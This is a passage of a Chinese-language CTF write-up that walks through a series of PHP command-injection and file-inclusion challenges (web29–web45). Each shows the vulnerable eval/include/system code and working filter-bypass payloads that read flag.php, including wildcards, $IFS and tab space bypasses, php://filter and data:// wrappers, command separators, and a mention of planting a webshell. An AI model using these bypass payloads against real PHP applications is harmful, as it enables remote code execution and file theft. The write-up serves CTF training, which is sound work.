<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&quot;cat fl*g.php&quot;);</span><br></pre></td></tr></table></figure>
<h4 id="方法四">方法四</h4>
<p>利用*去匹配文件名的一部分的以及利用cp将文件内容复制到另一文本中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&quot;cp fl*g.php fl0g.txt &quot;);</span><br></pre></td></tr></table></figure>
<p>然后再访问fl0g.txt就可以得到全部了</p>
<h4 id="方法五">方法五</h4>
<p>tac与system结合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&quot;tac%20fla*&quot;);</span><br></pre></td></tr></table></figure>
<p>tac和echo命令相结合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo%20`tac%20fla*`;</span><br></pre></td></tr></table></figure>
<h4 id="方法六">方法六</h4>
<p>使用参数引用+system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_GET[a]);&amp;a=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure>
<p>使用参数引用+伪协议读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>得到的需要base64解码</p>
<h4 id="方法七">方法七</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=highlight_file(next(array_reverse(scandir(&quot;.&quot;))));</span><br></pre></td></tr></table></figure>
<ol>
<li><strong>解释 <code>scandir(&quot;.&quot;)</code>：</strong>
<ul>
<li><code>scandir()</code> 函数用于获取指定目录中的文件和目录列表。</li>
<li><code>.</code> 表示当前目录。</li>
</ul>
</li>
<li><strong>解释 <code>array_reverse()</code>：</strong>
<ul>
<li><code>array_reverse()</code> 函数用于反转数组中的元素的顺序。</li>
</ul>
</li>
<li><strong>解释 <code>next()</code>：</strong>
<ul>
<li><code>next()</code> 函数用于将数组指针移动到数组中的下一个元素，并返回该元素的值。</li>
</ul>
</li>
<li><strong>解释 <code>highlight_file()</code>：</strong>
<ul>
<li><code>highlight_file()</code> 函数用于在浏览器中以语法高亮的形式显示 PHP 文件的内容。</li>
</ul>
</li>
</ol>
<p>有参考意义</p>
<h2 id="web30">web30</h2>
<h3 id="源码-2">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-2">payload</h3>
<p>参考上题，其实就是多过滤了一个system和php</p>
<p>因此上题的部分payload也能打通</p>
<p>以下给出几个主要思路去思考</p>
<h4 id="方法一-2">方法一</h4>
<p>使用echo去代替system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo%20`tac%20fla*`;</span><br></pre></td></tr></table></figure>
<h4 id="方法二">方法二</h4>
<p>使用其他命令执行函数去代替system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;tac%20fla*&quot;);</span><br></pre></td></tr></table></figure>
<h4 id="方法三-2">方法三</h4>
<p>使用参数引用+system</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_GET[a]);&amp;a=system(&quot;tac flag.php&quot;);</span><br></pre></td></tr></table></figure>
<p>使用参数引用+伪协议读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h4 id="方法四-2">方法四</h4>
<p>还有一种绕过方法</p>
<p>利用’ '去分割字符绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo `tac fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure>
<h4 id="方法五-2">方法五</h4>
<p>使用???去进行单个字符的匹配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo `tac%20fla?????`;</span><br></pre></td></tr></table></figure>
<h4 id="方法六-2">方法六</h4>
<p>构造一句话木马，蚁剑连接</p>
<h2 id="web31">web31</h2>
<h3 id="源码-3">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-3">payload</h3>
<p>相比上一题。这边多过滤了cat，sort，shell，\. ，空格，\</p>
<h4 id="方法一-3">方法一</h4>
<p>参数引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval($_GET[&quot;b&quot;]);&amp;b=system(&quot;tac%20flag.php&quot;);	</span><br></pre></td></tr></table></figure>
<h4 id="方法二-2">方法二</h4>
<p>其他执行函数绕过，以及*通配符，最不同的是空格方面的绕过方法</p>
<p>这边使用的命令拼接符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;tac%09fla?&quot;);</span><br></pre></td></tr></table></figure>
<p>FS$绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;tac\$IFS\$9fla*&quot;);</span><br></pre></td></tr></table></figure>

#### 方法三

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

1. `scandir(pos(localeconv()))`：获取当前目录下的文件列表。pos在这里的作用是为了代替出小数点。
2. `array_reverse`：将文件列表反转，改变它们的顺序。
3. `next`：获取反转后列表的下一个元素。
4. `show_source`：显示指定文件的源代码。

## web32

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

#### payload

增加了很多过滤，把echo相关也过滤掉了，以及(和；

#### 方法一

参数引用+伪协议读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

## web33

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

虽然增添了“的过滤，但是仍然可以使用文件包含的方法绕过

#### 方法一

参数引用+伪协议读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

#### 方法二

伪协议嵌入文本数据+参数引用

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

## web34

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

过滤了：，但是仍然可以使用文件包含的方式去绕过

#### 方法一

参数引用+伪协议读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

#### 方法二

伪协议嵌入文本数据+参数引用

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

## web35

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

同上

#### 方法一

参数引用+伪协议读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

#### 方法二

伪协议嵌入文本数据+参数引用

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

## web36

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

### payload

过滤了数字

#### 方法一

参数引用+伪协议读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

#### 方法二

伪协议嵌入文本数据+参数引用

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

## web37

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

这边使用的函数与上一部分略有区别，修改了部分，使用的是include函数的利用方法

仅过滤了flag字样，还是简单的

#### 方法一

使用了伪协议+base编码绕过读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br></pre></td></tr></table></figure>

#### 方法二

重点还是对伪协议的利用，*的绕过方法参考上面，当然，也可以使用?绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac fla*.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>

#### 方法三

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=php://input</span><br></pre></td></tr></table></figure>

Post

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>

## web38

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

增加了php和file两个协议的过滤

#### 方法一

使用了伪协议+base编码绕过读取

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br></pre></td></tr></table></figure>

#### 方法二

重点还是对伪协议的利用，*的绕过方法参考上面，当然，也可以使用?绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac fla*.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>

## web39

### 源码

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

自动拼接.php

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac%20fla*.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

## web40

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

参考web31方法三

#### 方法二

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval(next(reset(get_defined_vars())));&amp;1=;system(&quot;tac%20flag.php&quot;); </span><br></pre></td></tr></table></figure>

1. `?c=eval(next(reset(get_defined_vars())));`: 这部分是通过URL参数传递的命令。解析过程如下：

   - `get_defined_vars()`: 获取当前作用域中所有已定义的变量的列表。
   - `reset()`: 将数组内部的指针指向第一个元素，并返回该元素的值。
   - `next()`: 将数组内部的指针移动到下一个元素，并返回该元素的值。
   - `eval()`: 执行传入的字符串作为PHP代码。

   综合起来，这一部分的目的是获取当前作用域中的一个已定义变量，并将其值作为字符串传递给 `eval()` 函数，实际上是执行这个字符串作为PHP代码。

2. `&1=;system("tac%20flag.php");`: 这是第二个URL参数，其中 `1` 是参数名，而 `;` 表示将其值设为空。接着是一个 `system()` 函数调用，尝试执行系统命令。

   - `system("tac%20flag.php");`: 这部分试图执行 `tac` 命令，`tac` 是Linux系统中的一个命令，用于反向读取文件内容。`%20` 是URL编码中的空格。

## web41

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

### payload

本题过滤了字母和数字，那很明显就是考察的无字母数字rce了

详细的需要单独开一篇去说明相关原理和衍生方法

## web42

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

本题的关键在于使用了一个重定向，导致了无回显

使用分隔来进行绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;     分号</span><br><span class="line">|     只执行后面那条命令</span><br><span class="line">||    只执行前面那条命令</span><br><span class="line">&amp;     两条命令都会执行</span><br><span class="line">&amp;&amp;    两条命令都会执行</span><br><span class="line">%0a   换行符的url 编码</span><br></pre></td></tr></table></figure>

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php;ls</span><br></pre></td></tr></table></figure>

#### 方法二

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php||ls</span><br></pre></td></tr></table></figure>

#### 方法三

使用&和&&需要对其进行url编码

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php%26ls</span><br></pre></td></tr></table></figure>

#### 方法四

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php%0a</span><br></pre></td></tr></table></figure>

## web43

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

这里添加对cat命令和;的过滤，参考前部分的bypass手段即可，因此这边只给出一种参考payload

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php%0a</span><br></pre></td></tr></table></figure>

## web44

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

增加了对flag的过滤，直接参考上面

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac fla*.php%0a</span><br></pre></td></tr></table></figure>

## web45

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

过滤了空格

#### 方法一

%09绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla*.php%0a</span><br></pre></td></tr></table></figure>

#### 方法二

\${IFS}和\${IFS}$+数字绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac$&#123;IFS&#125;fla*.php%0a</span><br><span class="line">?c=tac$&#123;IFS&#125;$9fla*.php%0a</span><br></pre></td></tr></table></figure>

## web46

### 源码

